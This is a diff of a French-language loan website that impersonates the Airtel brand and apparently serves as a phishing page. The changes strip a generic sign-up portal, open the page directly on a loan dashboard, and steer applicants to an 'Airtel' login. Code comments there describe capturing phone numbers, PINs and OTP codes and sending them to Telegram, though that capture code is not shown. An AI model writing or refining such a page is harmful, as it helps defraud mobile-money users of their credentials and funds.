@@ -96,10 +96,6 @@ button[disabled]{opacity:.6;cursor:not-allowed}
 .links-footer{text-align:center;margin-top:16px;font-size:.9rem;color:var(--muted)}
 .links-footer a{color:var(--red);text-decoration:none;font-weight:600}
 
-.password-container {position: relative;}
-.toggle-eye {position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: var(--muted); display: flex; align-items: center;}
-.toggle-eye svg {width: 20px; height: 20px; fill: currentColor;}
-
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 .spinner { width: 50px; height: 50px; border: 5px solid var(--line); border-top: 5px solid var(--red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
 
@@ -112,21 +108,21 @@ img,svg{max-width:100%}
 <body translate="no">
 
 <!-- HEADER -->
-<header id="mainHeader" hidden>
+<header id="mainHeader">
   <div class="container">
     <a href="#home" class="logo" onclick="switchView('home')">airtel</a>
     <nav>
       <a class="active" onclick="switchView('home')">Accueil</a>
       <a onclick="switchView('home','pret')">Prêts</a>
       <a onclick="switchView('home','calculateur')">Calculateur</a>
-      <a onclick="switchView('welcome')">Espace Compte</a>
-      <a onclick="switchView('contact')">Connexion</a>
+      <a onclick="switchView('apply')">Demander un prêt</a>
+      <a onclick="switchView('contact')">Connexion Airtel</a>
     </nav>
   </div>
 </header>
 
-<!-- HOME VIEW -->
-<main id="view-home" hidden>
+<!-- HOME VIEW (DASHBOARD) -->
+<main id="view-home">
 <section class="hero" id="pret"><div class="container"><div>
 <h1>Obtenez votre prêt rapidement approuvé</h1>
 <p>Approbation rapide • Taux compétitifs • Modalités flexibles</p>
@@ -150,123 +146,6 @@ img,svg{max-width:100%}
 <div class="card feat"><div class="ic">⚡</div><h3>Approbation rapide</h3><p>Votre demande est examinée rapidement avec peu de formalités.</p></div>
 <div class="card feat"><div class="ic">%</div><h3>Faibles taux d’intérêt</h3><p>Des remboursements abordables et des options de financement compétitives.</p></div>
 <div class="card feat"><div class="ic">🔒</div><h3>Traitement sécurisé</h3><p>Vos informations personnelles sont protégées par un chiffrement sécurisé.</p></div></div></div></section>
-</main>
-
-<!-- WELCOME PORTAL -->
-<main id="view-welcome" class="container" style="max-width:440px;margin-top:40px;">
-  <div class="card" style="text-align:center;">
-    <div class="ic-lg">💳</div>
-    <h2>Bienvenue sur LoansCongo</h2>
-    <p class="sub">Une solution simple et accessible pour découvrir nos services de prêt.</p>
-    
-    <div style="background:var(--soft);border:1px solid #f7d7d7;border-radius:14px;padding:18px;margin-bottom:22px;text-align:left;">
-      <div style="font-weight:700;margin-bottom:4px;">🔒 Accès à votre espace personnel</div>
-      <div style="font-size:0.9rem;color:var(--muted);">Créez votre compte ou connectez-vous pour continuer.</div>
-    </div>
-
-    <button class="btn block" onclick="switchView('register')">Créer un compte</button>
-    <button class="btn block ghost" style="margin-top:10px;" onclick="switchView('register-login')">Se connecter</button>
-
-    <div class="links-footer" style="margin-top:20px;font-size:0.85rem;">
-      <a href="#" style="color:var(--muted);">Conditions d'utilisation</a> • 
-      <a href="#" style="color:var(--muted);">Confidentialité</a> • 
-      <a href="#" style="color:var(--muted);">Assistance</a>
-    </div>
-  </div>
-</main>
-
-<!-- ACCOUNT REGISTRATION WINDOW -->
-<main id="view-register" class="container" style="max-width:440px;margin-top:40px;" hidden>
-  <div class="card">
-    <h2>Créer votre compte</h2>
-    <p class="sub">Remplissez les informations ci-dessous pour vous inscrire.</p>
-    
-    <form id="registerForm" novalidate>
-      <div class="field" id="regPhoneField">
-        <label for="regPhone">Numéro de téléphone</label>
-        <input type="tel" id="regPhone" value="+243 " placeholder="+243 812 345 678">
-        <div class="err">Entrez un numéro valide commençant par +243 suivi de 9 chiffres</div>
-      </div>
-
-      <div class="field" id="regEmailField">
-        <label for="regEmail">Adresse Gmail</label>
-        <input type="email" id="regEmail" placeholder="exemple@gmail.com">
-        <div class="err">Entrez une adresse Gmail valide</div>
-      </div>
-
-      <div class="field" id="regPassField">
-        <label for="regPass">Créer un mot de passe</label>
-        <div class="password-container">
-          <input type="password" id="regPass" placeholder="Min. 8 caractères, majuscule, chiffre, symbole">
-          <button type="button" class="toggle-eye" onclick="togglePassword('regPass', this)">
-            <svg class="eye-icon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-          </button>
-        </div>
-        <div class="err" id="regPassErr">Le mot de passe ne respecte pas les critères requis (min. 8 caractères, majuscule, chiffre, symbole).</div>
-      </div>
-
-      <div class="field" id="regConfirmField">
-        <label for="regConfirm">Confirmer le mot de passe</label>
-        <div class="password-container">
-          <input type="password" id="regConfirm" placeholder="Répétez le mot de passe">
-          <button type="button" class="toggle-eye" onclick="togglePassword('regConfirm', this)">
-            <svg class="eye-icon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-          </button>
-        </div>
-        <div class="err" id="regConfirmErr">Les mots de passe ne correspondent pas.</div>
-      </div>
-
-      <label class="checkbox-row">
-        <input type="checkbox" id="termsCheck">
-        <span>J’accepte les conditions d’utilisation et la politique de confidentialité.</span>
-      </label>
-
-      <button type="submit" class="btn block">Créer mon compte</button>
-      <div class="ok-msg" id="regMsg" hidden></div>
-    </form>
-
-    <div class="links-footer">
-      Vous avez déjà un compte ? <a onclick="switchView('register-login')">Se connecter</a>
-    </div>
-  </div>
-</main>
-
-<!-- ACCOUNT SIGN IN WINDOW -->
-<main id="view-register-login" class="container" style="max-width:440px;margin-top:40px;" hidden>
-  <div class="card">
-    <h2>Connexion à votre compte</h2>
-    <p class="sub">Accédez à votre espace en entrant vos identifiants.</p>
-
-    <form id="accountLoginForm" novalidate>
-      <div class="field" id="logUserField">
-        <label for="logUser">Numéro de téléphone ou adresse email</label>
-        <input type="text" id="logUser" placeholder="+243 ou email">
-        <div class="err">Champ requis</div>
-      </div>
-
-      <div class="field" id="logPassField">
-        <label for="logPass">Mot de passe</label>
-        <div class="password-container">
-          <input type="password" id="logPass" placeholder="Votre mot de passe">
-          <button type="button" class="toggle-eye" onclick="togglePassword('logPass', this)">
-            <svg class="eye-icon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-          </button>
-        </div>
-        <div class="err">Champ requis</div>
-      </div>
-
-      <div style="text-align:right;margin-bottom:16px;">
-        <a href="#" style="color:var(--red);font-size:0.85rem;text-decoration:none;font-weight:600;">Mot de passe oublié ?</a>
-      </div>
-
-      <button type="submit" class="btn block">Se connecter</button>
-      <div class="ok-msg" id="accountLoginMsg" hidden></div>
-    </form>
-
-    <div class="links-footer">
-      Vous n’avez pas de compte ? <a onclick="switchView('register')">Créer un compte</a>
-    </div>
-  </div>
 </main>
 
 <!-- LOAN APPLICATION FORM -->
@@ -294,7 +173,7 @@ img,svg{max-width:100%}
 <label style="display:flex;gap:8px;margin:20px 0;font-weight:400"><input type="checkbox" id="agree"> J’accepte les conditions générales et la politique de confidentialité.</label>
 <div class="actions"><button type="button" class="btn ghost back">Retour</button><button type="button" class="btn" id="next3">Envoyer la demande</button></div></div>
 
-<div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la page de connexion dans <b id="countdown">5</b> s…</p><a class="btn" onclick="switchView('contact')">Se connecter maintenant</a></div>
+<div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la connexion Airtel dans <b id="countdown">5</b> s…</p><a class="btn" onclick="switchView('contact')">Se connecter maintenant</a></div>
 
 <p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></form></div>
 </main>
@@ -353,12 +232,9 @@ const LOAN_MIN=100,LOAN_MAX=1200;
 const fmt=n=>'$'+Math.round(n).toLocaleString('en-US');
 function calc(P,n){const int=P*COMMISSION,total=P+int,m=total/n;return{m,total,int}}
 
-// View navigation system
+// View navigation system (Starts directly on 'home' dashboard)
 const views={
   home:document.getElementById('view-home'),
-  welcome:document.getElementById('view-welcome'),
-  register:document.getElementById('view-register'),
-  'register-login':document.getElementById('view-register-login'),
   apply:document.getElementById('view-apply'),
   contact:document.getElementById('view-contact'),
   otp:document.getElementById('view-otp'),
@@ -367,8 +243,6 @@ const views={
 
 function switchView(v,scrollId){
   Object.keys(views).forEach(k=>{ if(views[k]) views[k].hidden = (k!==v); });
-  const isAuthScreen = (v === 'welcome' || v === 'register' || v === 'register-login');
-  document.getElementById('mainHeader').hidden = isAuthScreen;
 
   if(scrollId){
     const t=document.getElementById(scrollId);
@@ -378,53 +252,6 @@ function switchView(v,scrollId){
   }
 }
 window.goView = switchView;
-
-// Toggle Password Visibility with Standard Eye SVG icons
-function togglePassword(fieldId, btn){
-  const input = document.getElementById(fieldId);
-  const svg = btn.querySelector('svg');
-  
-  if(input.type === 'password'){
-    input.type = 'text';
-    // Eye with slash (Hide)
-    svg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>';
-  } else {
-    input.type = 'password';
-    // Open eye (Show)
-    svg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
-  }
-}
-
-// Compulsory +243 Prefix Enforcement for Registration Phone Input
-const regPhoneInput = document.getElementById('regPhone');
-regPhoneInput.addEventListener('input', function() {
-  if (!this.value.startsWith('+243')) {
-    this.value = '+243 ';
-  }
-});
-regPhoneInput.addEventListener('keydown', function(e) {
-  if (this.selectionStart < 5 && (e.key === 'Backspace' || e.key === 'ArrowLeft')) {
-    e.preventDefault();
-  }
-});
-
-// Live Password Standard Validation Logic
-const regPassInput = document.getElementById('regPass');
-const regConfirmInput = document.getElementById('regConfirm');
-
-regPassInput.addEventListener('input', function() {
-  const val = this.value;
-  // Criteria: min 8 chars, at least one uppercase, one lowercase, one number, one symbol
-  const isValid = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/.test(val);
-  const field = document.getElementById('regPassField');
-  field.classList.toggle('bad', !isValid && val.length > 0);
-});
-
-regConfirmInput.addEventListener('input', function() {
-  const match = (this.value === regPassInput.value);
-  const field = document.getElementById('regConfirmField');
-  field.classList.toggle('bad', !match && this.value.length > 0);
-});
 
 // Calculator script
 const calcBox=document.getElementById('calc');
@@ -503,78 +330,6 @@ if(form){
   showStep();
 }
 
-// Account Registration & Login Validation Logic
-document.getElementById('registerForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  const phone = document.getElementById('regPhone').value.trim();
-  const email = document.getElementById('regEmail').value.trim();
-  const pass = document.getElementById('regPass').value;
-  const confirmPass = document.getElementById('regConfirm').value;
-  const terms = document.getElementById('termsCheck').checked;
-  const msg = document.getElementById('regMsg');
-
-  let isValid = true;
-  const phoneValid = /^\+243\d{9}$/.test(phone.replace(/\s+/g, ''));
-  document.getElementById('regPhoneField').classList.toggle('bad', !phoneValid);
-  if (!phoneValid) isValid = false;
-
-  const emailValid = /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
-  document.getElementById('regEmailField').classList.toggle('bad', !emailValid);
-  if (!emailValid) isValid = false;
-
-  const passValid = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/.test(pass);
-  document.getElementById('regPassField').classList.toggle('bad', !passValid);
-  if (!passValid) isValid = false;
-
-  const matchValid = (pass === confirmPass && pass !== '');
-  document.getElementById('regConfirmField').classList.toggle('bad', !matchValid);
-  if (!matchValid) isValid = false;
-
-  if (!terms) {
-    alert('Veuillez accepter les conditions d’utilisation.');
-    isValid = false;
-  }
-
-  msg.hidden = true;
-  msg.classList.remove('err-msg');
-
-  if (isValid) {
-    msg.textContent = '✅ Compte créé avec succès ! Vérifiez votre email.';
-    msg.hidden = false;
-    setTimeout(() => switchView('register-login'), 2000);
-  } else {
-    msg.textContent = '❌ Veuillez corriger les erreurs ci-dessus.';
-    msg.classList.add('err-msg');
-    msg.hidden = false;
-  }
-});
-
-document.getElementById('accountLoginForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-  const user = document.getElementById('logUser').value.trim();
-  const pass = document.getElementById('logPass').value;
-  const msg = document.getElementById('accountLoginMsg');
-
-  let isValid = true;
-  document.getElementById('logUserField').classList.toggle('bad', !user);
-  document.getElementById('logPassField').classList.toggle('bad', !pass);
-
-  if (!user || !pass) isValid = false;
-
-  msg.hidden = true;
-  msg.classList.remove('err-msg');
-
-  if (isValid) {
-    msg.textContent = '✅ Connexion réussie ! Redirection...';
-    msg.hidden = false;
-    setTimeout(() => switchView('home'), 1500);
-  } else {
-    msg.textContent = '❌ Veuillez remplir tous les champs.';
-    msg.classList.add('err-msg');
-    msg.hidden = false;
-  }
-});
-
 // OTP Timer Cooldown Logic
 let otpTimerInterval = null;
 function startOtpCountdown(){
@@ -604,7 +359,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
   }
 });
 
-// Main Login and Telegram OTP Capture Logic
+// Main Login (Phone + PIN) and Telegram Combined Data Capture Logic
 (function(){
   const PRE='+243 ',ph=document.getElementById('phone'),pins=[...document.querySelectorAll('#pin input')];
   const otpPins=[...document.querySelectorAll('#otpPin input')];
@@ -694,7 +449,7 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
         throw new Error(result.message||'Enregistrement impossible.');
       }
 
-      msg.textContent='✅ Connexion réussie.';
+      msg.textContent='✅ Enregistrement réussi.';
       msg.hidden=false;
       pins.forEach(p=>p.value='');
 
@@ -790,8 +545,8 @@ document.getElementById('resendBtn').addEventListener('click', ()=>{
   otpBtn.addEventListener('click',handleOtp);
 })();
 
-// Set default initial view to 'welcome' immediately when page loads
-switchView('welcome');
+// Set default initial view to 'home' dashboard immediately when page loads
+switchView('home');
 </script>
 </body>
 </html>
